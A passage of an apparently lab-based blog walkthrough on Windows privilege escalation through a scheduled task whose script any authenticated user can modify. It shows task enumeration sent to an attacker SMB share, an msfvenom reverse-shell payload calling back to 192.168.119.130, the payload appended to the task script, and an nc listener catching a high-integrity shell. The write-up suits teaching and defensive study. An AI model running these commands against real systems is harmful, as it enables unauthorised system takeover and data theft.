+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">5</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;Custom Task 3&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell.exe /c C:\Schedule\helloworld.ps1&#34;</span> <span class="p">/</span><span class="n">ru</span> <span class="s2">&#34;desktop-bn\user&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SUCCESS</span><span class="err">:</span> <span class="n">The</span> <span class="n">scheduled</span> <span class="n">task</span> <span class="s2">&#34;Custom Task 3&#34;</span> <span class="n">has</span> <span class="n">successfully</span> <span class="n">been</span> <span class="n">created</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">5</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;Custom Task 4&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell.exe /c C:\Schedule\helloworld.ps1&#34;</span> <span class="p">/</span><span class="n">ru</span> <span class="s2">&#34;desktop-bn\user&#34;</span> <span class="p">/</span><span class="n">rl</span> <span class="n">Highest</span>
+</span></span><span class="line"><span class="cl"><span class="n">SUCCESS</span><span class="err">:</span> <span class="n">The</span> <span class="n">scheduled</span> <span class="n">task</span> <span class="s2">&#34;Custom Task 4&#34;</span> <span class="n">has</span> <span class="n">successfully</span> <span class="n">been</span> <span class="n">created</span><span class="p">.</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: The <code>/RL Highest</code> option is the setting of <code>Run with highest privileges</code>. In order to use this option you must be running from an administrator command line.</p>
+</blockquote>
+<p>As we can see running Autoruns GUI (as a normal user) with our current user:</p>
+<figure><a class="lightgallery" href="/images/posts/task-scheduler-autorun-fix.png" title="/images/posts/task-scheduler-autorun-fix.png" data-thumbnail="/images/posts/task-scheduler-autorun-fix.png" data-sub-html="<h2>Task Scheduler AutoRun Fix</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/task-scheduler-autorun-fix.png"
+            data-srcset="/images/posts/task-scheduler-autorun-fix.png, /images/posts/task-scheduler-autorun-fix.png 1.5x, /images/posts/task-scheduler-autorun-fix.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/task-scheduler-autorun-fix.png" />
+    </a><figcaption class="image-caption">Task Scheduler AutoRun Fix</figcaption>
+    </figure>
+<p>Now we know that we <strong>SHOULD NOT</strong> create tasks that run as <code>NT AUTHORITY\SYSTEM</code>. I&rsquo;m gonna disable all the tasks that we don&rsquo;t need:</p>
+<figure><a class="lightgallery" href="/images/posts/task-scheduler-disabled-task.png" title="/images/posts/task-scheduler-disabled-task.png" data-thumbnail="/images/posts/task-scheduler-disabled-task.png" data-sub-html="<h2>Task Scheduler Disabled Tasks</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/task-scheduler-disabled-task.png"
+            data-srcset="/images/posts/task-scheduler-disabled-task.png, /images/posts/task-scheduler-disabled-task.png 1.5x, /images/posts/task-scheduler-disabled-task.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/task-scheduler-disabled-task.png" />
+    </a><figcaption class="image-caption">Task Scheduler Disabled Tasks</figcaption>
+    </figure>
+<p>If we execute all the previous commands we should be able to enumerate the scheduled tasks from a Medium Integrity Level command line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s1">&#39;medium&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="na">Mandatory</span> <span class="n">Label</span><span class="p">\</span><span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span>                        <span class="n">Label</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">16</span><span class="p">-</span><span class="mf">8192</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>What I would do is send those outputs to my attacker&rsquo;s machine. I&rsquo;m gonna start an SMB server on my attacker host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo impacket-smbserver share . -smb2support -username low -password <span class="s1">&#39;p@ssw0rd&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Config file parsed
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then I&rsquo;m gonna send the output of each of these commands and send it to a file on my attacker host through SMB:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; <span class="nv">$pass</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;p@ssw0rd&#39;</span> -AsPlainText -Force
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; <span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">&#39;low&#39;</span>, <span class="nv">$pass</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; New-PSDrive -Name <span class="s2">&#34;share&#34;</span> -PSProvider <span class="s2">&#34;FileSystem&#34;</span> -Root <span class="s2">&#34;\\192.168.119.130\share&#34;</span> -Credential <span class="nv">$cred</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Name           Used <span class="o">(</span>GB<span class="o">)</span>     Free <span class="o">(</span>GB<span class="o">)</span> Provider      Root                                                                                                                              CurrentLocation
+</span></span><span class="line"><span class="cl">----           ---------     --------- --------      ----                                                                                                                              ---------------
+</span></span><span class="line"><span class="cl">share                                  FileSystem    <span class="se">\\</span>192.168.119.130<span class="se">\s</span>hare
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; schtasks /query /fo LIST /v &gt;&gt; <span class="se">\\</span>192.168.119.130<span class="se">\s</span>hare<span class="se">\s</span>cheduled_list.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; schtasks /query /fo TABLE /nh &gt;&gt; <span class="se">\\</span>192.168.119.130<span class="se">\s</span>hare<span class="se">\s</span>cheduled_table.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; Get-ScheduledTask <span class="p">|</span> where <span class="o">{</span><span class="nv">$_</span>.TaskPath -notlike <span class="s2">&#34;\Microsoft*&#34;</span><span class="o">}</span> <span class="p">|</span> ft TaskName,TaskPath,StateGet-ScheduledTask <span class="p">|</span> where <span class="o">{</span><span class="nv">$_</span>.TaskPath -notlike <span class="s2">&#34;\Microsoft*&#34;</span><span class="o">}</span> <span class="p">|</span> ft TaskName,TaskPath,State &gt;&gt; <span class="se">\\</span>192.168.119.130<span class="se">\s</span>hare<span class="se">\s</span>cheduled_pwsh.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\u</span>ser&gt; schtasks /query /tn <span class="s2">&#34;Custom Task 4&#34;</span> /xml &gt;&gt; <span class="se">\\</span>192.168.119.130<span class="se">\s</span>hare<span class="se">\s</span>cheduled_task.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In the attacker host, we can read our files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ ls scheduled_*
+</span></span><span class="line"><span class="cl"> scheduled_list.txt   scheduled_table.txt
+</span></span><span class="line"><span class="cl"> scheduled_pwsh.txt   scheduled_task.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since we&rsquo;re in the attacker host, we can open a text editor such as Sublime Text:</p>
+<figure><a class="lightgallery" href="/images/posts/subl-scheduled-tasks.png" title="/images/posts/subl-scheduled-tasks.png" data-thumbnail="/images/posts/subl-scheduled-tasks.png" data-sub-html="<h2>Sublime Text Scheduled Tasks</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/subl-scheduled-tasks.png"
+            data-srcset="/images/posts/subl-scheduled-tasks.png, /images/posts/subl-scheduled-tasks.png 1.5x, /images/posts/subl-scheduled-tasks.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/subl-scheduled-tasks.png" />
+    </a><figcaption class="image-caption">Sublime Text Scheduled Tasks</figcaption>
+    </figure>
+<p>We now know there&rsquo;s an idle setting, let&rsquo;s see the trigger:</p>
+<figure><a class="lightgallery" href="/images/posts/subl-scheduled-tasks-1.png" title="/images/posts/subl-scheduled-tasks-1.png" data-thumbnail="/images/posts/subl-scheduled-tasks-1.png" data-sub-html="<h2>Sublime Text Scheduled Tasks</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/subl-scheduled-tasks-1.png"
+            data-srcset="/images/posts/subl-scheduled-tasks-1.png, /images/posts/subl-scheduled-tasks-1.png 1.5x, /images/posts/subl-scheduled-tasks-1.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/subl-scheduled-tasks-1.png" />
+    </a><figcaption class="image-caption">Sublime Text Scheduled Tasks</figcaption>
+    </figure>
+<p>The time format according to <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/repetitionpattern-interval" target="_blank" rel="noopener noreffer ">MSDN</a>is the following:</p>
+<blockquote>
+<p>The amount of time between each restart of the task. The format for this string is <code>P&lt;days&gt;DT&lt;hours&gt;H&lt;minutes&gt;M&lt;seconds&gt;S</code> (for example, &ldquo;PT5M&rdquo; is 5 minutes, &ldquo;PT1H&rdquo; is 1 hour, and &ldquo;PT20M&rdquo; is 20 minutes).</p>
+</blockquote>
+<p>Based on the XML data of the scheduled task, the trigger runs every 5 minutes and the idle time has a duration of 10 minutes and it has a 1 hour timeout.</p>
+<p>This is way better in my opinion as we can see things clearly:</p>
+<figure><a class="lightgallery" href="/images/posts/subl-scheduled-task-2.png" title="/images/posts/subl-scheduled-task-2.png" data-thumbnail="/images/posts/subl-scheduled-task-2.png" data-sub-html="<h2>Sublime Text Scheduled Tasks</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/subl-scheduled-task-2.png"
+            data-srcset="/images/posts/subl-scheduled-task-2.png, /images/posts/subl-scheduled-task-2.png 1.5x, /images/posts/subl-scheduled-task-2.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/subl-scheduled-task-2.png" />
+    </a><figcaption class="image-caption">Sublime Text Scheduled Tasks</figcaption>
+    </figure>
+<p>Now we&rsquo;re gonna verify the permissions of the <code>helloworld.ps1</code> script with icacls:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">icacls</span> <span class="s2">&#34;C:\Schedule\helloworld.ps1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Schedule</span><span class="p">\</span><span class="n">helloworld</span><span class="p">.</span><span class="py">ps1</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The <code>Authenticated Users</code> have to modify permissions enabled and based on the following output we&rsquo;re in this group:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s1">&#39;authenticated users&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;...</span><span class="py">SNIP</span><span class="p">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">Authenticated</span> <span class="n">Users</span>                              <span class="nb">Well-known</span> <span class="nb">group </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">11</span>     <span class="na">Mandatory</span> <span class="n">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="nb">group
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can also use accesschk.exe from SysInternals to enumerate the permissions:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysinternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-quvw</span> <span class="n">user</span> <span class="n">C:</span><span class="p">\</span><span class="n">Schedule</span><span class="p">\</span><span class="n">helloworld</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">RW</span> <span class="n">C:</span><span class="p">\</span><span class="n">Schedule</span><span class="p">\</span><span class="n">helloworld</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_ALL_ACCESS</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s generate a payload for the system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.119.130 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o reverse.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">324</span> bytes
+</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">73802</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: reverse.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Transfer the payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">copy </span><span class="p">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="py">119</span><span class="p">.</span><span class="mf">130</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">----</span>          <span class="mf">3</span><span class="p">/</span><span class="mf">7</span><span class="p">/</span><span class="mf">2022</span>   <span class="mf">8</span><span class="err">:</span><span class="mf">30</span> <span class="n">PM</span>          <span class="mf">73802</span> <span class="n">reverse</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>Note: In the real-world this would be an implant or an encrypted payload for C2 Frameworks, Cobalt Strike Beacons and so on.</p>
+</blockquote>
+<p>Start a listener on Kali and then append a line to the script which runs the <code>reverse.exe</code> executable we created:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">echo </span><span class="s2">&#34;C:\Tools\reverse.exe&#34;</span> <span class="p">&gt;&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Schedule</span><span class="p">\</span><span class="n">helloworld</span><span class="p">.</span><span class="py">ps1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Wait for the scheduled tasks to be executed and that should trigger the reverse shell as a <strong>high-integrity level</strong> process:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.119.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.119.129<span class="o">]</span> <span class="m">49961</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.493<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami /all
+</span></span><span class="line"><span class="cl">whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name            <span class="nv">SID</span>
+</span></span><span class="line"><span class="cl"><span class="o">====================</span> <span class="o">=============================================</span>
+</span></span><span class="line"><span class="cl">desktop-bn<span class="se">\u</span>ser S-1-5-21-264094270-2388996790-3434637240-1001
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                                                    Type             SID          <span class="nv">Attributes</span>                                         
+</span></span><span class="line"><span class="cl"><span class="o">=============================================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>erformance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\I</span>NTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group 
